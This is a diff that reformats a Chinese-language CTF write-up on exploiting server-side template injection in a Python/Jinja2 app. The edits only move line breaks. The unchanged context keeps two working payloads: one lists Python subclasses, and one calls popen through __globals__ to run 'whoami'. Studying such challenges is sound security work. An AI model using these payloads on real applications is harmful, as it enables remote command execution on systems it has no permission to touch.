@@ -88,11 +88,13 @@ def index():
 
 ## 解题思路
 
-1.找到模板注入点
-
 <br>
 
+1.找到模板注入点
+
 2.先查看所有的子类
+
+<br>
 
 ````
 {{"".__class__.__bases__[0].__subclasses__()}}
@@ -171,7 +173,6 @@ print((mem-1)/2)
 <br>
 
 3.命令执行
-
 ````
 {{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}
 ````
